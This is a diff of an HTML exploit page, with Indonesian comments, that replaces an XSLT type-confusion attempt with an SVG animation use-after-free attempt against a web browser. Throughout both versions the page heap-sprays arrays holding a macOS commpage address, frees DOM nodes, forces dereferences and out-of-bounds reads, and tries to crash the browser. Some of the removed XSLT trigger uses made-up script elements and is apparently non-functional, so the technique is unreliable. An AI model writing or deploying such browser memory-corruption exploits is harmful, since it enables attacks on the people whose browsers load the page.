@@ -1,26 +1,35 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>XSLT Structure Confusion (Final UAF)</title>
+    <title>SVG Animation UAF (DOM Lifecycle)</title>
 </head>
 <body>
 
-    <h1>XSLT Structure Confusion (Targeting Arbitrary Read)</h1>
+    <h1>SVG Animation UAF (Final DOM Corruption)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan XSLT Deserialization Attack...</p>
+    <p id="status">INIT: Mempersiapkan SVG Animation UAF...</p>
     <div id="log-area"></div>
 
+    <svg id="svg" width="500" height="500">
+        <filter id="f">
+            <feComponentTransfer>
+                <feFuncR id="victim" type="linear" slope="1" intercept="0">
+                    <animate attributeName="slope" to="0" dur="10s" id="anim"/>
+                </feFuncR>
+            </feComponentTransfer>
+        </filter>
+    </svg>
+    
     <script>
-        // --- KONSTANTA COMM PAGE ---
+        // ... (KONSTANTA COMM PAGE SAMA) ...
         const COMM_PAGE64_BASE_ADDRESS = BigInt("0x0000000FFFFFC000");
-        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); // Alamat untuk Arbitrary Read
-        
+        const TARGET_ADDRESS = COMM_PAGE64_BASE_ADDRESS + BigInt("0x328"); 
         const LOW_WORD_ADDR = Number(TARGET_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD_ADDR = Number(TARGET_ADDRESS >> 32n);
-
+        
+        // ... (FUNGSI LOG & SPRAY SAMA) ...
         let startTime = performance.now();
         let payloadHolders = []; 
-        let victimArray = new Uint32Array(512); // Array korban untuk AR/AW
 
         function log(message, type = 'log-info') {
             const timeElapsed = (performance.now() - startTime).toFixed(2);
@@ -29,109 +38,69 @@
             logElement.scrollTop = logElement.scrollHeight;
         }
 
-        // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            log("Memulai Spraying Payload (Float64Array)...", "log-spray");
+            log("Memulai Spraying Payload SINKRON (Targeting SVG Node/Pointer)...", "log-spray");
             const SPRAY_COUNT = 3000;
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
-                // Payload berisi TARGET_ADDRESS (Menargetkan Pointer Data/Length)
                 payloadArray[0] = HIGH_WORD_ADDR; 
                 payloadArray[1] = LOW_WORD_ADDR;
                 payloadHolders.push(payloadArray); 
             }
         }
         
-        // --- DATA XSLT DENGAN UAF TRIGGER (Simulasi) ---
-        // XML Stylesheet yang mengandung elemen yang akan di-free
-        const xsl = `<?xml version="1.0"?>
-            <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
-                            xmlns:msxml="urn:schemas-microsoft-com:xslt" 
-                            xmlns:xscript="http://example.com/xscript">
-
-            <xsl:output method="html"/>
-
-            <xsl:template match="/">
-                <xscript:external-call target="triggerUAF"/>
-            </xsl:template>
-            
-            <xscript:script>
-                function triggerUAF() {
-                    // Memicu manipulasi DOM Tree secara agresif 
-                    // yang akan menyebabkan node XSLT yang diproses di-free
-                    
-                    // 1. FREE: Hapus node stylesheet yang sedang di-*parse*
-                    var doc = document.implementation.createDocument("", "", null);
-                    var newStylesheet = doc.importNode(document.styleSheets[0].ownerNode, true);
-                    document.styleSheets[0].ownerNode.parentNode.replaceChild(newStylesheet, document.styleSheets[0].ownerNode);
-                    
-                    // 2. SPRAY: Lakukan spray segera setelah FREE
-                    setTimeout(sprayPayload, 0); 
-                    
-                    // 3. TRIGGER: Paksa prosesor XSLT untuk kembali ke node yang sudah di-free
-                    // Kita asumsikan XSLT Engine melanjutkan eksekusi di sini.
-                    return 0;
-                }
-            </xscript:script>
-            </xsl:stylesheet>`;
-            
         // --- FUNGSI UTAMA ATTACK ---
-        function runXSLTAttack() {
+        function runSVGAttack() {
             startTime = performance.now();
-            log("Phase 1: Membuat dokumen XML dan XSLT.", "log-init");
+            log("Phase 1: Setup SVG Animation Object.", "log-init");
 
-            // 1. Persiapan Dokumen
-            let xmlDoc = document.implementation.createDocument(null, "data", null);
-            let xsltDoc = (new DOMParser()).parseFromString(xsl, "application/xml");
+            const victim = document.getElementById('victim');
+            const anim = document.getElementById('anim');
             
-            // 2. Grooming Heap: Alokasikan array korban di heap.
-            victimArray.fill(0xBABEBABE);
-            log("Phase 2: Array Korban dialokasikan.", "log-info");
-            
-            // 3. Eksekusi XSLT (Ini akan memanggil triggerUAF)
-            log("Phase 3: Memulai transformasi XSLT (Akan memicu UAF/Spray).", "log-critical");
-            try {
-                // Gunakan XSLTProcessor (lebih modern, lebih tersembunyi dari mitigasi)
-                let xsltProcessor = new XSLTProcessor();
-                xsltProcessor.importStylesheet(xsltDoc);
-                
-                // Mulai Transformasi (Memanggil XSLT dan triggerUAF di dalamnya)
-                let resultFragment = xsltProcessor.transformToFragment(xmlDoc, document);
-                document.body.appendChild(resultFragment);
+            // 1. FREE (Async): Pemicu Event Handler yang men-free node SVG
+            // Kita akan mengganti parent dari elemen 'victim' yang sedang dianimasikan.
+            victim.parentElement.removeChild(victim);
+            log("Phase 2: Victim SVG Node dihapus (FREE 1).", "log-critical");
 
-            } catch (e) {
-                log(`XSLT Processor Error: ${e.message} - Menunggu Crash Implisit.`, "log-error");
-            }
+            // 2. SPRAY SINKRON: Menimpa lokasi memori node SVG yang di-free.
+            sprayPayload();
+            log("Phase 3: SPRAY Commpage Payload SINKRON.", "log-critical");
+
+            // 3. TRIGGER: Paksa Update C++ SVG Animation (Use After Free)
+            // Coba akses properti atau metode node yang sudah di-free.
             
-            // 4. Trigger Arbitrary Read (Asumsi UAF berhasil menimpa pointer victimArray)
             setTimeout(() => {
-                log("Phase 5: Memicu Arbitrary Read pada Victim Array...", "log-critical");
+                log("Phase 4: Memicu UAF Akses pada Animation Node...", "log-critical");
                 
                 try {
-                    // Jika UAF menimpa pointer victimArray, index 1000 akan menjadi OOB Read
-                    const OOB_INDEX = 1000; 
-                    const readValue = victimArray[OOB_INDEX];
+                    // Coba akses properti/metode node SVG yang sudah di-free.
+                    // Ini akan mencoba dereferensi pointer yang sudah ditimpa oleh spray (TARGET_ADDRESS)
                     
-                    log(`Nilai OOB dibaca: 0x${readValue.toString(16)}`, "log-critical");
+                    // Metode yang memaksa C++ dereference pointer (misalnya, memulai ulang animasi)
+                    anim.beginElement(); 
                     
-                    // Trigger Final: EXC_BAD_ACCESS
-                    if (readValue) {
-                        let crashFunction = new Function('a', `return a[${readValue}]`);
-                        crashFunction(new Array(10)); 
-                    }
+                    // Coba akses properti read-write yang memaksa dereference node
+                    const test = victim.slope; 
+                    
+                    log(`Nilai slope (Diduga Corrupt) dibaca: ${test}`, "log-critical");
 
                 } catch(e) {
-                     log(`JS Exception: ${e.message} - Menunggu Crash OS (EXC_BAD_ACCESS)...`, "log-critical");
+                    log(`JS Exception: ${e.message} - Menunggu Crash OS (UAF/Arbitrary Read)...`, "log-critical");
                 }
-            }, 500); // Beri waktu untuk XSLT Engine selesai
+                
+                // Trigger tambahan: Paksa Garbage Collection
+                 for(let i = 0; i < 50; i++) {
+                    new Array(1024 * 1024 * 5).fill(0xDEADBEEF);
+                }
+            }, 100);
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian XSLT Attack...';
-            setTimeout(runXSLTAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Type Confusion melalui XSLT.';
+            document.getElementById('status').textContent = 'Memulai rangkaian SVG Animation UAF Attack...';
+            setTimeout(runSVGAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah DOM/SVG UAF.';
         });
     </script>
     <style>
